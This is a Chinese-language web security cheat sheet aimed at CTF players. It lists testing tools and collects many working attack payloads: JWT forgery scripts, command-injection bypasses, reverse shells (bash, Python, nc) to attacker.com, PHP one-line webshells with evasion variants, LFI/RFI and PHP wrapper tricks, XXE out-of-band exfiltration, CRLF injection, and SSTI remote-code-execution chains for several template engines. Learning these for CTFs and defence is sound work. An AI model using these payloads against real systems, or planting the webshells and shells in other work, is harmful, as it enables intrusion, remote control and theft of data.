# Web安全综合工具

综合性的Web安全测试和分析工具。

## 在线工具

### 综合平台

| 工具名称 | 链接 | 功能 |
|---------|------|------|
| CyberChef | [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/) | 数据分析瑞士军刀 |
| HackBar | 浏览器扩展 | 浏览器安全测试工具栏 |
| BugKu在线工具 | [https://ctf.bugku.com/tools](https://ctf.bugku.com/tools) | CTF工具集合 |

### JWT工具

| 工具名称 | 链接 | 功能 |
|---------|------|------|
| JWT.io | [https://jwt.io/](https://jwt.io/) | JWT解码、验证签名 |
| jwt_tool | [GitHub](https://github.com/ticarpi/jwt_tool) | JWT安全测试工具 |

### 请求测试工具

| 工具名称 | 链接 | 功能 |
|---------|------|------|
| RequestBin | [https://requestbin.com/](https://requestbin.com/) | HTTP请求收集器 |
| Webhook.site | [https://webhook.site/](https://webhook.site/) | 临时URL接收器 |
| httpbin | [https://httpbin.org/](https://httpbin.org/) | HTTP请求测试服务 |
| Beeceptor | [https://beeceptor.com/](https://beeceptor.com/) | REST API模拟 |

### 在线Payload生成

| 工具名称 | 链接 | 功能 |
|---------|------|------|
| Payload Box | [https://github.com/payloadbox](https://github.com/payloadbox) | 各类Payload集合 |
| PayloadsAllTheThings | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings) | 综合Payload仓库 |

## 离线工具

### Burp Suite

**下载链接**:
```
https://portswigger.net/burp/communitydownload
```

**功能**: Web安全测试平台

**主要模块**:
- **Proxy**: 拦截修改HTTP/HTTPS流量
- **Repeater**: 重放请求，调试Payload
- **Intruder**: 自动化攻击（爆破、Fuzzing）
- **Decoder**: 编解码工具
- **Comparer**: 请求/响应对比
- **Sequencer**: 令牌随机性分析
- **Scanner**: 漏洞扫描（仅Pro版）

**基本使用**:
```
1. 启动Burp Suite
2. Proxy -> Options -> 监听127.0.0.1:8080
3. 浏览器配置代理
4. 访问http://burp下载证书（HTTPS需要）
5. 开始拦截流量
```

### jwt_tool

**下载链接**:
```
https://github.com/ticarpi/jwt_tool
```

**安装**:
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip install -r requirements.txt
```

**基本使用**:
```bash
# 解析JWT
python jwt_tool.py <JWT_TOKEN>

# 扫描已知漏洞
python jwt_tool.py <JWT_TOKEN> -M at

# 尝试空签名攻击
python jwt_tool.py <JWT_TOKEN> -X a

# 密钥爆破
python jwt_tool.py <JWT_TOKEN> -C -d wordlist.txt

# 修改payload
python jwt_tool.py <JWT_TOKEN> -I -pc name -pv "admin"

# 所有测试
python jwt_tool.py <JWT_TOKEN> -M pb
```

**JWT攻击类型**:
```
1. 算法混淆 (alg: RS256 → HS256)
   - 使用公钥作为HMAC密钥
   
2. 空签名 (alg: none)
   - 移除签名部分
   
3. 弱密钥爆破
   - 字典攻击HMAC密钥
   
4. kid参数注入
   - kid: /etc/passwd
   - kid: ../../../../dev/null
   
5. jwk头注入
   - 自己的公钥注入jwk头
```

### Hash Extender

**下载链接**:
```
https://github.com/iagox86/hash_extender
```

**安装**:
```bash
git clone https://github.com/iagox86/hash_extender
cd hash_extender
make
```

**基本使用**:
```bash
# MD5长度扩展攻击
./hash_extender -d "原始数据" -s "原始MD5哈希" -a "追加数据" -f md5 -l 原始数据长度

# SHA1
./hash_extender -d "data" -s "hash" -a "append" -f sha1 -l 4

# SHA256
./hash_extender -d "data" -s "hash" -a "append" -f sha256 -l 4

# 实际案例
./hash_extender --data "count=1&user=guest" --secret-length=8 --append "&admin=true" --signature "原始哈希" --format md5
```

**原理**: 利用Merkle-Damgård结构哈希算法的特性

**适用算法**: MD5, SHA-1, SHA-256, SHA-512, SM3

**Python实现**:
```python
# 使用hashpumpy库
import hashpumpy

# 计算扩展后的哈希和数据
new_hash, new_data = hashpumpy.hashpump(
    original_hash,
    original_data,
    append_data,
    key_length
)
```

**其他工具**:
```
https://github.com/Phantomn/HashPump
https://github.com/JoyChou93/md5-extension-attack
https://github.com/LJY-21/Length_Extension_Attack_for_SM3.py (SM3)
```

### BashFuck

**下载链接**:
```
https://github.com/ProbiusOfficial/bashFuck
```

**功能**: Bash命令混淆和绕过

**使用场景**: 命令注入WAF绕过

### CTF-WScan

**下载链接**:
```
https://github.com/OrangeWatermelon/ctf-wscan
```

**功能**: CTF定向Web目录扫描

**特点**: CTF常见路径字典

### GitHack

**下载链接**:
```
https://github.com/lijiejie/GitHack
```

**安装使用**:
```bash
git clone https://github.com/lijiejie/GitHack
cd GitHack
pip install -r requirements.txt

# 下载.git目录
python GitHack.py http://example.com/.git/
```

**用途**: 恢复.git泄露的源码

### dirsearch

**下载链接**:
```
https://github.com/maurosoria/dirsearch
```

**安装使用**:
```bash
git clone https://github.com/maurosoria/dirsearch
cd dirsearch
pip install -r requirements.txt

# 基本扫描
python dirsearch.py -u http://example.com/

# 指定扩展名
python dirsearch.py -u http://example.com/ -e php,html,js

# 使用自定义字典
python dirsearch.py -u http://example.com/ -w wordlist.txt

# 递归扫描
python dirsearch.py -u http://example.com/ -r

# 保存结果
python dirsearch.py -u http://example.com/ -o output.txt
```

## 漏洞类型详解

### JWT攻击

**JWT结构**:
```
Header.Payload.Signature
eyJhbGc.eyJ1c2Vy.SflKxwRJ
```

**攻击1: 算法混淆 (alg: RS256 → HS256)**:
```python
# 服务端使用RS256验证，攻击者改为HS256
# 使用公钥作为HMAC密钥签名

import jwt

# 获取公钥
public_key = open('public.pem').read()

# 修改payload
payload = {"user": "admin"}

# 使用HS256和公钥签名
token = jwt.encode(payload, public_key, algorithm='HS256')
```

**攻击2: 空签名 (alg: none)**:
```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin"}

# Base64编码
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')

# 移除签名（注意末尾的点）
token = header_b64.decode() + '.' + payload_b64.decode() + '.'
```

**攻击3: 密钥爆破**:
```bash
# 使用jwt_tool
python jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# 使用hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

**攻击4: kid参数注入**:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```

### 命令注入

**常用分隔符**:
```bash
; ls           # 顺序执行
| ls           # 管道
|| ls          # 逻辑或
& ls           # 后台执行
&& ls          # 逻辑与
`ls`           # 反引号
$(ls)          # 命令替换
\n ls          # 换行符（%0a）
```

**绕过空格**:
```bash
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
cat<>/etc/passwd
```

**绕过关键字过滤**:
```bash
# 引号绕过
l''s
l""s
l\s
l$@s

# 变量拼接
a=l;b=s;$a$b

# Base64编码
echo "bHM=" | base64 -d | bash
echo "bHM=" | base64 -d | sh

# 十六进制
echo -e "\x6c\x73"

# 通配符
/???/c?t /???/p??s??
```

**反弹Shell**:
```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# NC
nc -e /bin/sh attacker.com 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

### 文件上传

**绕过技巧总结**:

| 绕过类型 | 方法 | 示例 |
|---------|------|------|
| 前端验证 | 禁用JavaScript | F12删除验证代码 |
| MIME类型 | 修改Content-Type | Content-Type: image/jpeg |
| 黑名单绕过 | 使用其他扩展名 | .php3 .php5 .phtml .pht |
| 大小写绕过 | 混合大小写 | .PhP .AsP .jSp |
| 双重扩展名 | 添加两个扩展名 | shell.php.jpg |
| 空字节注入 | %00截断 | shell.php%00.jpg |
| .htaccess | 修改解析规则 | AddType application/x-httpd-php .jpg |
| 条件竞争 | 快速访问 | 上传后立即访问 |

**文件头伪造**:
```
GIF89a (GIF)
\xFF\xD8\xFF (JPEG)
\x89PNG (PNG)
PK (ZIP)
```

**Webshell示例**:
```php
# 一句话木马
<?php @eval($_POST['cmd']); ?>

# 免杀变形
<?php $a=$_POST['cmd'];$a(); ?>

# 伪装图片
GIF89a
<?php @eval($_POST['cmd']); ?>

# .htaccess
AddType application/x-httpd-php .jpg
```

### 文件包含

**本地文件包含(LFI)**:
```php
# Linux敏感文件
/etc/passwd
/etc/shadow
/etc/hosts
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ
/proc/self/cmdline

# Windows敏感文件
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini

# 目录遍历
../../../etc/passwd
....//....//....//etc/passwd
..\/..\/..\/etc/passwd
```

**PHP伪协议**:
```php
# filter - 读取PHP源码
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=flag.php

# input - POST数据执行
php://input
POST数据: <?php system($_GET['cmd']); ?>

# data - 直接执行代码
data://text/plain,<?php system('ls'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+

# zip - 压缩包利用
zip://shell.zip#shell.php
zip://uploads/shell.jpg%23shell.php

# phar - 反序列化
phar://shell.phar/shell.txt
```

**日志包含**:
```bash
# 在User-Agent中写入PHP代码
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 包含日志文件
?file=/var/log/apache2/access.log&cmd=whoami
```

**远程文件包含(RFI)**:
```php
# HTTP
?file=http://attacker.com/shell.txt

# FTP
?file=ftp://attacker.com/shell.txt

# SMB (Windows)
?file=\\attacker.com\share\shell.txt
```

### XXE注入

**基本读取文件**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**外部DTD**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
```

**evil.dtd内容**:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

**Blind XXE (盲打)**:
```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
```

**SSRF via XXE**:
```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal-server/">
]>
<root>&xxe;</root>
```

### CRLF注入

**原理**: 注入`\r\n`控制HTTP响应头

**Payload**:
```
# 设置Cookie
%0d%0aSet-Cookie: admin=true

# 重定向
%0d%0aLocation: http://evil.com

# XSS
%0d%0a%0d%0a<script>alert(1)</script>

# 响应拆分
%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### 模板注入 (SSTI)

**Jinja2 (Python/Flask)**:
```python
# 测试
{{7*7}}        → 49

# 配置信息
{{config.items()}}

# RCE
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}

# 简化版
{{lipsum.__globals__['os'].popen('ls').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Twig (PHP)**:
```php
# 测试
{{7*7}}

# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}

{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("cat /etc/passwd")}}
```

**FreeMarker (Java)**:
```java
# 测试
${7*7}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}

<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>
${ex("java.lang.ProcessBuilder","whoami").start()}
```

**Velocity (Java)**:
```java
# 测试
#set($x=7*7)$x

# RCE
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami")
```

## 信息泄露

### 常见敏感文件

```
# 配置文件
/.env
/config.php
/config.yml
/application.properties
/web.config

# 源码管理
/.git/
/.svn/
/.hg/
/.bzr/

# 备份文件
/backup.zip
/backup.sql
/db.sql
/dump.sql
/www.tar.gz

# 编辑器临时文件
/.index.php.swp
/.index.php.swo
/index.php~
/index.php.bak
/index.php.old
/index.php.orig

# 信息泄露
/phpinfo.php
/info.php
/test.php
/robots.txt
/sitemap.xml
/crossdomain.xml

# 日志文件
/error.log
/access.log
/debug.log
```

### Git泄露恢复

**检测**:
```bash
# 访问
http://target.com/.git/config
http://target.com/.git/HEAD
```

**恢复源码**:
```bash
# 使用GitHack
python GitHack.py http://target.com/.git/

# 使用git-dumper
git-dumper http://target.com/.git/ output/

# 手动恢复
wget -r http://target.com/.git/
cd .git
git reset --hard
```

## CTF解题技巧

!!! tip "Web题解题流程"
    ```
    1. 信息收集
       - 查看源码、注释
       - robots.txt
       - 目录扫描
       - 技术栈识别（Wappalyzer）
    
    2. 漏洞发现
       - SQL注入测试
       - XSS测试
       - 命令注入测试
       - 文件上传/包含测试
    
    3. 漏洞利用
       - 构造Payload
       - 绕过WAF/过滤
       - 获取Shell/数据
    
    4. 提权/深入
       - 查找flag
       - 提权操作
       - 内网渗透
    ```

!!! tip "快速测试清单"
    ```
    - [ ] SQL注入: ' " --
    - [ ] XSS: <script>alert(1)</script>
    - [ ] 命令注入: ; | && ||
    - [ ] 文件上传: shell.php
    - [ ] 文件包含: ../../../etc/passwd
    - [ ] XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">
    - [ ] SSRF: http://127.0.0.1/
    - [ ] SSTI: {{7*7}}
    - [ ] 反序列化: O:8:"User":1:{s:4:"name";s:5:"admin";}
    - [ ] JWT攻击: alg: none
    ```

!!! warning "常见问题"
    - **编码问题**: 注意URL编码、HTML实体编码
    - **WAF绕过**: 大小写混合、编码、注释混淆
    - **权限问题**: 上传路径、文件权限
    - **目录遍历**: 不同操作系统路径分隔符
    - **协议限制**: allow_url_fopen, allow_url_include

!!! tip "工具组合拳"
    ```
    1. 信息收集: Wappalyzer + dirsearch + GitHack
    2. 流量分析: Burp Suite + HackBar
    3. 漏洞利用: SQLMap + XSStrike + 手工测试
    4. 数据外带: Webhook.site + RequestBin
    5. JWT攻击: jwt_tool
    6. 命令注入: BashFuck绕过
    ```

## 相关资源

- **Burp Suite**: Web渗透必备，Community版免费
- **jwt_tool**: JWT攻击瑞士军刀
- **PayloadsAllTheThings**: 最全面的Payload仓库
- **CyberChef**: 数据处理万能工具
- **Webhook.site**: 数据外带利器
